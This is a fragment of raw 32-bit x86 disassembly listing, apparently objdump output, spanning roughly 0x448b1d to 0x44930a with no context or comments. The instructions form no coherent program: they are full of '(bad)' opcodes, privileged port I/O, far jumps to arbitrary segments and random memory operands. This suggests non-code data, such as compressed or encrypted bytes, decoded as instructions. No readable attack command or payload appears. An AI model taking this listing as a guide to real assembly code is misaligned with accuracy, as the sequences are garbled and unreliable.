  448b1d:	add    edi,DWORD PTR [edi+edi*1+0x42ddb7d1]
  448b24:	xchg   esi,eax
  448b25:	ja     0x448b46
  448b27:	jnp    0x448b3b
  448b29:	inc    ecx
  448b2a:	repnz leave 
  448b2c:	inc    edx
  448b2d:	xlat   BYTE PTR ds:[ebx]
  448b2e:	je     0x448acf
  448b30:	push   ebp
  448b31:	sbb    eax,DWORD PTR [ebp-0x2b]
  448b34:	cmp    DWORD PTR [ebp-0x64ae9050],edx
  448b3a:	pusha  
  448b3b:	mov    cl,0x3e
  448b3d:	mov    ds:0x60322940,al
  448b42:	fs aam 0x5a
  448b45:	mov    ch,0x49
  448b47:	outs   dx,DWORD PTR ds:[esi]
  448b48:	imul   edi,edx,0xffffff88
  448b4b:	xchg   esi,eax
  448b4c:	mov    BYTE PTR [ecx+0x407a1ce7],dh
  448b52:	dec    esi
  448b53:	into   
  448b54:	mov    ebx,0xa68d5205
  448b59:	cmc    
  448b5a:	sub    bh,bl
  448b5c:	xchg   esi,eax
  448b5d:	test   BYTE PTR [esi-0x33],ah
  448b60:	push   edx
  448b61:	xchg   ebx,eax
  448b62:	mov    bh,0x58
  448b64:	ja     0x448bc9
  448b66:	cmp    eax,0xe4025d1f
  448b6b:	das    
  448b6c:	pop    esi
  448b6d:	xor    DWORD PTR [esi],edx
  448b6f:	(bad)  
  448b70:	outs   dx,DWORD PTR ds:[esi]
  448b71:	cmp    eax,0xb544fd1e
  448b76:	or     al,0xc
  448b78:	mov    edx,0x54d58e62
  448b7d:	cwde   
  448b7e:	fldcw  WORD PTR [edx+ebp*4]
  448b81:	test   eax,edx
  448b83:	pop    ebx
  448b84:	mov    BYTE PTR [ebx+0x5ff0638a],bh
  448b8a:	cli    
  448b8b:	aaa    
  448b8c:	add    eax,DWORD PTR [ebx]
  448b8e:	push   0xd4ae3fe6
  448b93:	xchg   ebx,eax
  448b94:	mov    ebp,0xad160d9
  448b99:	in     eax,dx
  448b9a:	sbb    BYTE PTR [ecx-0x2b94fd44],0x14
  448ba1:	jge    0x448bc8
  448ba3:	pop    es
  448ba4:	sbb    al,0xe8
  448ba6:	in     eax,dx
  448ba7:	dec    edx
  448ba8:	mov    DWORD PTR [edi-0x29faa5bf],edi
  448bae:	mov    edx,0xacdf3ce5
  448bb3:	(bad)  
  448bb4:	jge    0x448bf6
  448bb6:	mov    dh,0xf9
  448bb8:	mov    ds:0xec9490a2,al
  448bbd:	cmp    bl,BYTE PTR [edx]
  448bbf:	dec    edx
  448bc0:	mov    BYTE PTR [ebx-0x31],al
  448bc3:	dec    esi
  448bc4:	push   ds
  448bc5:	imul   esi,DWORD PTR [esi],0x92265e51
  448bcb:	or     BYTE PTR [ebp-0x11],al
  448bce:	lahf   
  448bcf:	or     eax,0x53334de5
  448bd4:	mov    bh,0x1
  448bd6:	pop    es
  448bd7:	rol    DWORD PTR [edi],0x33
  448bda:	pop    eax
  448bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448bdc:	sub    ah,bh
  448bde:	push   esi
  448bdf:	es lock dec ecx
  448be2:	cmp    al,0xd5
  448be4:	sub    al,BYTE PTR [ebx+0x746417cb]
  448bea:	mov    ch,0xc9
  448bec:	mov    BYTE PTR [ecx+0x3553ad3],ch
  448bf2:	in     eax,dx
  448bf3:	call   0xd768:0x32e202c5
  448bfa:	mov    edi,0x60ca0aae
  448bff:	shl    DWORD PTR [eax+edi*4],1
  448c02:	cdq    
  448c03:	add    ecx,DWORD PTR [esi+0x18d70f47]
  448c09:	dec    eax
  448c0a:	xor    BYTE PTR ds:0xedb3f67b,0x40
  448c11:	mov    eax,ds:0x74f8f36d
  448c16:	out    0xc9,al
  448c18:	enter  0x1f65,0x28
  448c1c:	rol    DWORD PTR ds:0x4ac694a0,cl
  448c22:	cli    
  448c23:	ins    DWORD PTR es:[edi],dx
  448c24:	pop    edx
  448c25:	push   0xfffffff7
  448c27:	jecxz  0x448c3f
  448c29:	add    bh,dh
  448c2b:	jmp    0xe7d79ed
  448c30:	rcl    BYTE PTR [edx+eax*8],cl
  448c33:	add    BYTE PTR [ecx-0x1f748429],al
  448c39:	pop    ss
  448c3a:	jmp    0xfcb18b3
  448c3f:	lds    ecx,FWORD PTR [eax-0xd336e33]
  448c45:	clc    
  448c46:	inc    ebx
  448c47:	ret    
  448c48:	inc    eax
  448c49:	add    ah,dh
  448c4b:	xor    bh,BYTE PTR [ebp*8-0x1a252fb]
  448c52:	outs   dx,BYTE PTR ds:[esi]
  448c53:	test   eax,0x547ab030
  448c58:	or     DWORD PTR [edx],edx
  448c5a:	in     eax,dx
  448c5b:	popf   
  448c5c:	popf   
  448c5d:	add    ah,BYTE PTR [esi-0x7c]
  448c60:	stos   DWORD PTR es:[edi],eax
  448c61:	sbb    eax,0xff7211b8
  448c66:	gs push ecx
  448c68:	test   DWORD PTR [ebp+0x5e046511],ebx
  448c6e:	adc    eax,0x489788c5
  448c73:	sbb    cl,BYTE PTR [eax]
  448c75:	xchg   edi,eax
  448c76:	pusha  
  448c77:	cdq    
  448c78:	push   edx
  448c79:	mov    ebp,0xd87a66c
  448c7e:	pop    ss
  448c7f:	pop    edi
  448c80:	ret    
  448c81:	mov    cl,0x99
  448c83:	sbb    edx,ebp
  448c85:	retf   
  448c86:	push   ecx
  448c87:	inc    ecx
  448c88:	push   ebp
  448c89:	mov    ds:0x8a6620a0,eax
  448c8e:	jl     0x448c4d
  448c90:	mov    ecx,esi
  448c92:	mov    esi,0xd34acb99
  448c97:	adc    BYTE PTR [edi-0x7433f7fe],dl
  448c9d:	cmc    
  448c9e:	inc    ebx
  448c9f:	cs dec edi
  448ca1:	inc    esp
  448ca2:	push   ds
  448ca3:	inc    ebx
  448ca4:	cmp    DWORD PTR [ebx+0x2d27f4a4],esp
  448caa:	jno    0x448cb0
  448cac:	mov    edi,edx
  448cae:	popa   
  448caf:	push   edi
  448cb0:	bound  ebx,QWORD PTR [edx+edx*4+0x5ca37cf9]
  448cb7:	xor    eax,DWORD PTR [esi+0x5637ec09]
  448cbd:	popf   
  448cbe:	pop    edi
  448cbf:	icebp  
  448cc0:	push   edx
  448cc1:	jae    0x448d03
  448cc3:	aam    0xc0
  448cc5:	outs   dx,DWORD PTR ds:[esi]
  448cc6:	pop    ebp
  448cc7:	push   edi
  448cc8:	inc    esp
  448cca:	mul    BYTE PTR [eax]
  448ccc:	ins    DWORD PTR es:[edi],dx
  448ccd:	pop    ebp
  448cce:	jge    0x448d09
  448cd0:	xchg   esi,eax
  448cd1:	mov    edi,0xa085f72
  448cd6:	pop    ecx
  448cd7:	div    BYTE PTR [eax-0x222bad99]
  448cdd:	dec    ecx
  448cde:	adc    al,0x6e
  448ce0:	push   esi
  448ce1:	pop    ecx
  448ce2:	popa   
  448ce3:	adc    al,0x96
  448ce5:	jns    0x448c94
  448ce7:	mov    ebp,0xc87fc5fc
  448cec:	data16 adc dh,BYTE PTR [eax]
  448cef:	aam    0x1f
  448cf1:	adc    DWORD PTR [edx+0x3e412148],esp
  448cf7:	outs   dx,BYTE PTR ds:[esi]
  448cf8:	mov    DWORD PTR [edi-0x4c],ecx
  448cfb:	add    eax,DWORD PTR [esi-0x79622837]
  448d01:	add    dh,dh
  448d03:	sub    al,0x46
  448d05:	add    DWORD PTR [edx],esp
  448d07:	sbb    dh,dl
  448d09:	sbb    BYTE PTR [edi],0x85
  448d0c:	adc    ah,BYTE PTR ds:0x31407fcd
  448d12:	ins    BYTE PTR es:[edi],dx
  448d13:	aam    0xfd
  448d15:	inc    edi
  448d16:	mov    BYTE PTR [ecx],bl
  448d18:	or     eax,0x71affbff
  448d1d:	pop    edi
  448d1e:	pop    ebx
  448d1f:	sbb    edx,DWORD PTR [esi-0x6a]
  448d22:	lahf   
  448d23:	stc    
  448d24:	sub    bl,BYTE PTR [ebx-0x28]
  448d27:	dec    ebp
  448d28:	ret    0x6975
  448d2b:	shl    DWORD PTR [ecx-0x40bef1eb],cl
  448d31:	sub    al,0x69
  448d33:	aam    0xe1
  448d35:	int3   
  448d36:	pop    ecx
  448d37:	inc    edx
  448d38:	mov    BYTE PTR [ebp+0x6ddc1c32],al
  448d3e:	xchg   esp,eax
  448d3f:	out    dx,al
  448d40:	icebp  
  448d41:	test   bl,dl
  448d43:	mov    ebx,0xd0ad8089
  448d48:	sub    ebx,edi
  448d4a:	dec    eax
  448d4b:	dec    edx
  448d4c:	xchg   BYTE PTR [ebx-0x72],bl
  448d4f:	call   0xbb8e:0x551fe185
  448d56:	push   ebx
  448d57:	mov    DWORD PTR [eax+0x52a26323],edi
  448d5d:	retf   0x51f
  448d60:	imul   ecx,DWORD PTR [ecx+0x3b],0x20398981
  448d67:	sub    eax,0x61a3c025
  448d6c:	mov    dl,0x5
  448d6e:	pusha  
  448d6f:	mov    bh,0x12
  448d71:	nop
  448d72:	icebp  
  448d73:	xchg   esp,eax
  448d74:	les    ebx,FWORD PTR [ebp+0x1e]
  448d77:	icebp  
  448d78:	dec    ebx
  448d79:	adc    eax,0x2937082d
  448d7e:	(bad)  
  448d7f:	cmc    
  448d80:	sub    BYTE PTR [ebp-0x68],al
  448d83:	adc    al,0xd9
  448d85:	add    dl,BYTE PTR [edi-0x12e07962]
  448d8b:	test   eax,0x731fe879
  448d90:	inc    ebx
  448d91:	add    eax,0xaa1ca60d
  448d96:	(bad)  
  448d97:	aam    0xf2
  448d99:	or     cl,BYTE PTR [edx-0x348be0f0]
  448d9f:	mov    ds:0xdae32b8a,al
  448da4:	popa   
  448da5:	or     bl,bl
  448da7:	adc    BYTE PTR [eax-0x5d],dh
  448daa:	not    edx
  448dac:	xchg   BYTE PTR [edi*1+0x5c12fc05],cl
  448db3:	adc    al,0x43
  448db5:	aas    
  448db6:	jnp    0x448e2b
  448db8:	cli    
  448db9:	xchg   ebp,eax
  448dba:	xchg   edx,eax
  448dbb:	stos   DWORD PTR es:[edi],eax
  448dbc:	fs popf 
  448dbe:	aam    0x6d
  448dc0:	enter  0x9163,0x66
  448dc4:	mov    esi,0xf52c1e14
  448dc9:	dec    ecx
  448dca:	fcom   DWORD PTR [esi]
  448dcc:	aaa    
  448dcd:	scas   eax,DWORD PTR es:[edi]
  448dce:	das    
  448dcf:	adc    al,0x81
  448dd1:	or     al,0x1f
  448dd3:	ins    DWORD PTR es:[edi],dx
  448dd4:	shl    ebp,1
  448dd6:	sbb    esi,DWORD PTR [ebx]
  448dd8:	call   0x239c:0x8b89ad7
  448ddf:	dec    ebp
  448de0:	stc    
  448de1:	retf   0xedc0
  448de4:	push   eax
  448de5:	and    DWORD PTR [eax+0x69],0x18a5332d
  448dec:	push   esp
  448ded:	out    dx,eax
  448dee:	imul   edi,DWORD PTR [edx+0x4f8f3192],0x48
  448df5:	leave  
  448df6:	in     eax,0x96
  448df8:	jmp    0xfff7:0xdac71f0c
  448dff:	xlat   BYTE PTR ds:[ebx]
  448e00:	(bad)  
  448e01:	or     DWORD PTR [ecx],esp
  448e03:	inc    ecx
  448e04:	lea    esp,[edi+0x81e0d1f]
  448e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448e0b:	inc    ebp
  448e0c:	xor    DWORD PTR [ebp+0x5d1cf96],esi
  448e12:	mov    esp,0xfceb75a3
  448e17:	inc    esp
  448e18:	add    al,BYTE PTR [edx]
  448e1a:	push   ds
  448e1b:	call   0x2a27c0d0
  448e20:	sub    eax,0xcc7159f2
  448e25:	pop    ebp
  448e26:	ins    BYTE PTR es:[edi],dx
  448e27:	dec    ebp
  448e28:	inc    edx
  448e29:	stc    
  448e2a:	lahf   
  448e2b:	dec    esi
  448e2c:	ss jmp 0xb30d4a10
  448e32:	in     eax,0x27
  448e34:	mov    DWORD PTR [edx+0x5944b904],edx
  448e3a:	push   ds
  448e3b:	push   ebp
  448e3c:	cdq    
  448e3d:	and    DWORD PTR ds:0x8a9b81c2,eax
  448e43:	fist   DWORD PTR [eax+eax*1-0x52]
  448e47:	jbe    0x448e97
  448e49:	inc    ebp
  448e4a:	cmp    eax,0x7e637ae0
  448e4f:	dec    DWORD PTR [ecx-0x9e62557]
  448e55:	xchg   edx,eax
  448e56:	push   DWORD PTR [ebp-0x40]
  448e59:	dec    edx
  448e5a:	ins    BYTE PTR es:[edi],dx
  448e5b:	jle    0x448ed9
  448e5d:	add    ecx,DWORD PTR [edi-0x53]
  448e60:	jmp    0x2a59:0x89b7e28d
  448e67:	mov    esi,0x46880478
  448e6c:	cmp    eax,DWORD PTR [ebx]
  448e6e:	call   0xe03aaa06
  448e73:	push   eax
  448e74:	in     al,0xaa
  448e76:	jle    0x448e2f
  448e78:	cmp    al,0x4f
  448e7a:	mov    ecx,0x48e5494
  448e7f:	iret   
  448e80:	jb     0x448e96
  448e82:	ss clc 
  448e84:	cld    
  448e85:	sub    ecx,esi
  448e87:	push   edx
  448e88:	push   es
  448e89:	in     eax,dx
  448e8a:	lock mov dl,0x23
  448e8d:	in     al,dx
  448e8e:	gs xchg ecx,eax
  448e90:	out    dx,eax
  448e91:	fidiv  DWORD PTR [esi+0x6e]
  448e94:	xor    eax,edx
  448e96:	jp     0x448ef7
  448e98:	pushf  
  448e99:	add    ch,ah
  448e9b:	add    esp,edx
  448e9d:	mov    ch,0xa9
  448e9f:	mov    dl,0x7e
  448ea1:	ins    BYTE PTR es:[edi],dx
  448ea2:	push   ds
  448ea3:	mov    ecx,0x88bb83c0
  448ea8:	nop
  448ea9:	stc    
  448eaa:	loop   0x448e66
  448eac:	iret   
  448ead:	jp     0x448f1a
  448eaf:	mov    bh,0x34
  448eb1:	or     BYTE PTR [edi+0x6e],0xa0
  448eb5:	in     al,0x63
  448eb7:	adc    BYTE PTR [ebp+0x21],0x7c
  448ebb:	xor    eax,0x54ee231f
  448ec0:	mov    al,0x5e
  448ec2:	push   cs
  448ec3:	ret    
  448ec4:	mov    edi,0x12509a17
  448ec9:	xor    eax,esi
  448ecb:	mov    bl,dh
  448ecd:	sbb    BYTE PTR [ecx],0xb9
  448ed0:	jno    0x448f44
  448ed2:	sbb    esi,esi
  448ed4:	pusha  
  448ed5:	push   edi
  448ed6:	ins    BYTE PTR es:[edi],dx
  448ed7:	cmp    DWORD PTR [ebx+0x282e28c1],eax
  448edd:	rol    DWORD PTR [ebx],cl
  448edf:	pop    esi
  448ee0:	jl     0x448ef6
  448ee2:	push   esp
  448ee3:	sub    al,0x7f
  448ee5:	adc    al,al
  448ee7:	hlt    
  448ee8:	cmp    ebp,ebp
  448eea:	jbe    0x448f49
  448eec:	jge    0x448f0c
  448eee:	push   ds
  448eef:	sub    DWORD PTR [edi],eax
  448ef1:	adc    cl,dh
  448ef3:	(bad)
  448ef6:	pop    edi
  448ef7:	aam    0x7
  448ef9:	jno    0x448f3c
  448efb:	sbb    ebx,DWORD PTR [esi-0x5e]
  448efe:	jg     0x448f7a
  448f00:	xchg   DWORD PTR ds:0xd500adb5,edx
  448f06:	jg     0x448f56
  448f08:	out    dx,al
  448f09:	cmp    eax,0xf64bb997
  448f0e:	add    BYTE PTR [ecx+0x55778e49],0xd3
  448f15:	xchg   ebp,eax
  448f16:	ffreep st(1)
  448f18:	int3   
  448f19:	je     0x448f1f
  448f1b:	mov    eax,0xccc06dd5
  448f20:	mov    es,WORD PTR ds:0x5489027a
  448f26:	(bad)  
  448f27:	sub    eax,0x221bad89
  448f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448f2d:	add    DWORD PTR [esi+0x1d],0x0
  448f31:	daa    
  448f32:	ss iret 
  448f34:	sahf   
  448f35:	ficomp WORD PTR [edi-0x9dad7b2]
  448f3b:	add    DWORD PTR [ebx-0x3f872f5d],ecx
  448f41:	cmp    edi,DWORD PTR [ebx+0x54]
  448f44:	fsub   QWORD PTR [ebp+0x5b]
  448f47:	lods   eax,DWORD PTR ds:[esi]
  448f48:	cmp    DWORD PTR [ebx],0xfffffff2
  448f4b:	cs int3 
  448f4d:	in     eax,0x60
  448f4f:	push   0xd432d1b0
  448f54:	mov    ecx,0x324613
  448f59:	ja     0x448fd6
  448f5b:	stos   BYTE PTR es:[edi],al
  448f5c:	mov    fs,ebx
  448f5e:	in     eax,0xbb
  448f60:	nop
  448f61:	ficom  DWORD PTR [ebx]
  448f63:	inc    edx
  448f64:	sub    BYTE PTR [edi-0x21b9db02],0xd6
  448f6b:	aad    0xb9
  448f6d:	lea    edx,[edx]
  448f6f:	das    
  448f70:	dec    ecx
  448f71:	iret   
  448f72:	test   eax,0x1e2478d1
  448f77:	std    
  448f78:	ja     0x448f70
  448f7a:	mov    al,0xa4
  448f7c:	int3   
  448f7d:	jg     0x448f99
  448f7f:	(bad)  
  448f80:	sbb    al,0x20
  448f82:	mov    al,0xd
  448f84:	call   0x1f46:0xe0dd55f3
  448f8b:	lea    esp,[esi+ebx*1-0x3d]
  448f8f:	xchg   esp,eax
  448f91:	adc    eax,0x321cb85d
  448f96:	xor    DWORD PTR [ecx+0x9],edx
  448f99:	add    eax,0xf1adc5b8
  448f9e:	jle    0x448fcf
  448fa0:	test   ebx,ebp
  448fa2:	mov    eax,0xcf422dba
  448fa7:	jmp    0x2cb:0x1186a4c8
  448fae:	inc    eax
  448faf:	les    ebx,FWORD PTR [edx]
  448fb1:	add    eax,0x67e08b3e
  448fb6:	imul   cl
  448fb8:	mov    bh,0x5
  448fba:	ror    BYTE PTR [ecx-0x62],1
  448fbd:	(bad)  
  448fbe:	ins    DWORD PTR es:[edi],dx
  448fbf:	add    eax,0xa9e025f
  448fc4:	or     al,0xf5
  448fc6:	ret    
  448fc7:	arpl   WORD PTR [eax],si
  448fc9:	int3   
  448fca:	pop    ds
  448fcb:	or     esi,esi
  448fcd:	mov    ds:0xa2aa8e86,eax
  448fd2:	add    eax,0x46263aaa
  448fd7:	jne    0x44900b
  448fd9:	xor    DWORD PTR [edx-0x40e66d0d],0xfffffff8
  448fe0:	mov    DWORD PTR [ebp+0x5b716ae1],edi
  448fe6:	js     0x448fec
  448fe8:	mov    WORD PTR [edi],ds
  448fea:	mov    esi,0xc45e7c37
  448fef:	mov    dh,0xf8
  448ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448ff2:	xchg   edx,eax
  448ff3:	lea    edx,[ebp+0x730a1d3f]
  448ff9:	sbb    al,0xc6
  448ffb:	mov    ah,0xd8
  448ffd:	sub    dh,0xf2
  449000:	mov    bh,0x5
  449002:	fcomp  DWORD PTR [eax+0x8b9c4f3]
  449008:	test   eax,0xec471e03
  44900d:	sbb    edx,ecx
  44900f:	dec    ebp
  449010:	mov    esi,0xf7e5a9ac
  449015:	add    al,BYTE PTR [ebx+eax*1-0x1747949d]
  44901c:	xchg   BYTE PTR [eax+0x1f],dl
  44901f:	fwait
  449020:	mov    dl,0x51
  449022:	(bad)
  449025:	(bad)  [edi-0x28]
  449028:	enter  0x9e02,0xf
  44902c:	out    0x41,al
  44902e:	sub    eax,0x60af1678
  449033:	sbb    eax,0xd9ae2439
  449038:	adc    BYTE PTR [ecx],0x42
  44903b:	aam    0xa5
  44903d:	cld    
  44903e:	add    DWORD PTR [ecx],esp
  449040:	mov    edi,0xb800c9c7
  449045:	cwde   
  449046:	pusha  
  449047:	mov    ecx,DWORD PTR [esi-0x7f979461]
  44904d:	inc    ebp
  44904e:	inc    edi
  44904f:	aam    0x10
  449051:	(bad)  
  449052:	(bad)  
  449053:	call   0x9e16b6aa
  449058:	mov    DWORD PTR [edi+0x6c],esi
  44905b:	fcom   QWORD PTR [edi+0x48]
  44905e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44905f:	add    eax,0x8af26766
  449064:	ins    DWORD PTR es:[edi],dx
  449065:	add    ebp,DWORD PTR [eax+0x77956a80]
  44906b:	xor    ebx,DWORD PTR [edi+0x2069862f]
  449071:	add    ebp,DWORD PTR [esp+eiz*8-0x74]
  449075:	jg     0x4490a6
  449077:	stos   BYTE PTR es:[edi],al
  449078:	inc    edx
  449079:	inc    eax
  44907a:	pop    esi
  44907b:	(bad)  
  44907c:	ret    
  44907d:	and    bl,BYTE PTR [edx+0x1f664b1b]
  449083:	or     ebp,DWORD PTR [edi-0x6524d53d]
  449089:	inc    edi
  44908a:	mov    bl,0xd4
  44908c:	push   edx
  44908d:	loopne 0x4490c4
  44908f:	rcr    BYTE PTR [ecx+eiz*2+0xba544ab],0x46
  449097:	int3   
  449098:	mov    BYTE PTR [edi+0x75d7e4ea],ch
  44909e:	js     0x4490e6
  4490a0:	dec    ebp
  4490a1:	test   eax,0x5ee1ff1f
  4490a6:	(bad)  
  4490a7:	mov    ah,0x2b
  4490a9:	neg    DWORD PTR [ebp+0x3427fa19]
  4490af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4490b0:	sub    BYTE PTR [edi+ebp*2],dl
  4490b3:	and    al,0xa9
  4490b5:	sub    BYTE PTR [esi+ebp*1+0x2a0205f1],dl
  4490bc:	jge    0x449121
  4490be:	jp     0x44908f
  4490c0:	pop    ebx
  4490c1:	(bad)  
  4490c2:	pop    edx
  4490c3:	mov    ecx,0xf59f15f2
  4490c8:	sub    al,0x52
  4490ca:	xor    esi,DWORD PTR [edx]
  4490cc:	xchg   ebx,eax
  4490cd:	add    eax,0x9ef1a6f8
  4490d2:	dec    dl
  4490d4:	repnz sub al,0x1e
  4490d7:	mov    edi,edi
  4490d9:	xchg   esi,eax
  4490da:	pusha  
  4490db:	inc    BYTE PTR [edx+0x30d5451f]
  4490e1:	cdq    
  4490e2:	ss push ds
  4490e4:	test   eax,0x8904758f
  4490e9:	ffree  st(7)
  4490eb:	or     al,0xdf
  4490ed:	lods   al,BYTE PTR ds:[esi]
  4490ee:	sbb    BYTE PTR [ebx-0x35],dh
  4490f1:	add    al,al
  4490f3:	leave  
  4490f4:	mov    ds:0xe61c57c9,eax
  4490f9:	rcr    DWORD PTR [edi],0x31
  4490fc:	xchg   ebp,eax
  4490fd:	mov    esp,0x45c61413
  449102:	jecxz  0x4490d9
  449104:	push   0x13
  449106:	push   edx
  449107:	jnp    0x449117
  449109:	pop    ebx
  44910a:	adc    esi,0xc3fe458b
  449110:	or     dl,BYTE PTR ds:0x9347273
  449116:	loopne 0x44913a
  449118:	mov    dl,0xf8
  44911a:	pusha  
  44911b:	pop    edi
  44911c:	addr16 cli 
  44911e:	jge    0x44917b
  449120:	loopne 0x449112
  449122:	jp     0x4490f7
  449124:	aam    0x8d
  449126:	mov    ds:0x40dc0217,eax
  44912b:	push   esi
  44912c:	es or  eax,0x4d571961
  449132:	or     BYTE PTR [esi+0x12],al
  449135:	mov    eax,ds:0x984869ed
  44913a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44913b:	sahf   
  44913c:	cmp    DWORD PTR [ebx],eax
  44913e:	outs   dx,BYTE PTR ds:[esi]
  44913f:	imul   esi,DWORD PTR [edx-0x2492a380],0x801f1f4d
  449149:	nop
  44914a:	in     al,dx
  44914b:	sbb    BYTE PTR [edx],bh
  44914d:	and    DWORD PTR [ecx-0x67f4c1f0],0xffffffb8
  449154:	and    al,0xfb
  449156:	jge    0x4490e6
  449158:	or     ebx,DWORD PTR [ebx+edi*1+0x6c]
  44915c:	arpl   WORD PTR gs:[eax],sp
  44915f:	ret    
  449160:	mov    BYTE PTR [ecx-0x4b],dl
  449163:	inc    dh
  449165:	es cs test al,0x29
  449169:	add    cl,dl
  44916b:	retf   
  44916c:	sub    bh,BYTE PTR [edi]
  44916e:	shl    bl,cl
  449170:	sbb    cl,0x60
  449173:	xchg   DWORD PTR [esi-0x47],edx
  449176:	(bad)  
  449177:	sbb    bh,BYTE PTR [eax-0x5c2a62ac]
  44917d:	scas   eax,DWORD PTR es:[edi]
  44917e:	nop
  44917f:	lea    esi,[esi-0x6b9dd01b]
  449185:	or     esp,DWORD PTR [edx]
  449187:	loopne 0x44917d
  449189:	xchg   edi,eax
  44918a:	call   0xe6d5fa36
  44918f:	retf   
  449190:	lahf   
  449191:	add    cl,BYTE PTR [edx+esi*8-0x59]
  449195:	push   ebx
  449196:	adc    al,0xbb
  449198:	repz call 0xb35e:0x19fd0d14
  4491a0:	push   edi
  4491a1:	(bad)  
  4491a2:	jle    0x4491e5
  4491a4:	dec    ecx
  4491a5:	and    DWORD PTR [ebx+0x36],0xffffffea
  4491a9:	sar    DWORD PTR [eax-0x47],0x69
  4491ad:	jb     0x44915d
  4491af:	and    DWORD PTR [eax-0x7e416f96],ecx
  4491b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4491b6:	pusha  
  4491b7:	mov    ch,0x8f
  4491b9:	push   esp
  4491ba:	and    esp,esp
  4491bc:	inc    esp
  4491bd:	jecxz  0x44915b
  4491bf:	int    0x8f
  4491c1:	add    eax,0x2f5bc6b6
  4491c6:	outs   dx,DWORD PTR ds:[esi]
  4491c7:	add    esi,DWORD PTR [edi-0x68]
  4491ca:	pop    ds
  4491cb:	jecxz  0x4491d4
  4491cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4491ce:	clc    
  4491cf:	test   al,0x52
  4491d1:	jno    0x4491fb
  4491d3:	shl    esi,1
  4491d5:	outs   dx,DWORD PTR ds:[esi]
  4491d6:	push   0xffffffbd
  4491d8:	fcomp  QWORD PTR [ebx-0xe]
  4491db:	hlt    
  4491dc:	iret   
  4491dd:	mov    bh,0x57
  4491df:	scas   eax,DWORD PTR es:[edi]
  4491e0:	sub    eax,DWORD PTR [eax+eiz*8]
  4491e3:	cli    
  4491e4:	jp     0x4491f7
  4491e6:	in     al,0xe2
  4491e8:	inc    ecx
  4491e9:	add    bh,BYTE PTR [eax+0x6851bf1d]
  4491ef:	ret    
  4491f0:	cmp    ecx,DWORD PTR [ebx]
  4491f2:	pop    edx
  4491f3:	xchg   ecx,eax
  4491f4:	inc    ebx
  4491f5:	xor    eax,0x79c7dd9e
  4491fa:	bound  ebp,QWORD PTR [edi+0x186e03fc]
  449200:	ja     0x449270
  449202:	mov    esi,0xa4bd812e
  449207:	xchg   edi,eax
  449208:	call   0xc917f743
  44920d:	mov    al,ds:0x32e2e9f1
  449212:	lds    edi,FWORD PTR [edi+eiz*2+0x62844802]
  449219:	jecxz  0x4491a5
  44921b:	pop    ds
  44921c:	gs push es
  44921e:	pusha  
  44921f:	stc    
  449220:	shl    BYTE PTR [ebx+ebx*4],0xa9
  449224:	jl     0x449219
  449226:	xchg   ebp,eax
  449227:	mov    ecx,0x88ec98ee
  44922c:	mov    DWORD PTR [edx-0x5a0fba5f],ebp
  449232:	(bad)  
  449233:	leave  
  449234:	loopne 0x4491e2
  449236:	push   ds
  449237:	ja     0x449252
  449239:	xor    bh,cl
  44923b:	pop    eax
  44923c:	push   cs
  44923d:	add    edx,DWORD PTR [esi-0x50]
  449240:	scas   eax,DWORD PTR es:[edi]
  449241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449242:	int    0xcf
  449244:	fnstenv [eax+0x59]
  449247:	mov    cl,0xf4
  449249:	cwde   
  44924a:	loopne 0x449284
  44924c:	retf   0x3688
  44924f:	xchg   BYTE PTR [ecx],dl
  449251:	add    edx,esi
  449253:	jne    0x44922b
  449255:	push   ds
  449256:	push   ecx
  449257:	test   al,0xd
  449259:	mov    edx,0xe3895e92
  44925e:	xchg   edi,eax
  44925f:	dec    ebp
  449260:	pop    esp
  449261:	outs   dx,DWORD PTR ds:[esi]
  449263:	mov    DWORD PTR [ebx+0x6b061602],ebx
  449269:	leave  
  44926a:	into   
  44926b:	pushf  
  44926c:	ret    
  44926d:	or     BYTE PTR [edx-0x2cfcf0c7],bl
  449273:	int    0xee
  449275:	push   esi
  449276:	and    ch,BYTE PTR [edx+0x232426ac]
  44927c:	lea    edx,[esi]
  44927e:	fsubrp st(6),st
  449280:	push   esi
  449281:	cld    
  449282:	jge    0x4492dd
  449284:	mov    ecx,edi
  449286:	add    BYTE PTR [ebp-0x49],al
  449289:	jmp    0x2cf3675
  44928e:	or     al,0x3d
  449290:	dec    esp
  449291:	imul   DWORD PTR [edi+0x2e]
  449294:	(bad)  
  449295:	setnp  BYTE PTR [ecx+0x68]
  449299:	sbb    eax,0x89b0769e
  44929e:	inc    ebx
  44929f:	xor    eax,0x7dd023df
  4492a4:	js     0x4492e5
  4492a6:	mov    eax,ds:0x2be210d4
  4492ab:	push   ebp
  4492ac:	stc    
  4492ad:	mov    cl,0x60
  4492af:	std    
  4492b0:	pop    eax
  4492b1:	and    eax,0x33ce2ddd
  4492b6:	mov    dl,0xd4
  4492b8:	pop    edx
  4492b9:	and    DWORD PTR [ebx+0x40],eax
  4492bc:	mov    dl,BYTE PTR [ecx+0x18952a0]
  4492c2:	or     al,0xdc
  4492c4:	sub    al,0x9e
  4492c6:	fmul   QWORD PTR ss:[ebx]
  4492c9:	add    eax,DWORD PTR [ebp+eax*1+0x468257ec]
  4492d0:	xor    DWORD PTR [edi+0x5a1eb9d],eax
  4492d6:	sbb    al,0x82
  4492d8:	mov    edx,0x63ea200e
  4492dd:	dec    ebx
  4492de:	cmp    al,0x39
  4492e0:	fwait
  4492e1:	add    eax,DWORD PTR [eax+0x7572fc56]
  4492e7:	stc    
  4492e8:	or     ch,BYTE PTR [eax+0x57]
  4492eb:	les    ebp,FWORD PTR [esi-0x236a9f07]
  4492f1:	mov    eax,0x56e96c39
  4492f6:	outs   dx,DWORD PTR ds:[esi]
  4492f7:	cmp    al,0xe1
  4492f9:	mov    ds,WORD PTR [edi]
  4492fb:	out    dx,eax
  4492fc:	jo     0x449321
  4492fe:	xchg   ebx,eax
  4492ff:	adc    al,0xb5
  449301:	icebp  
  449302:	sbb    BYTE PTR [edi+0x20659389],bh
  449308:	not    edx
  44930a:	sub    al,0xb
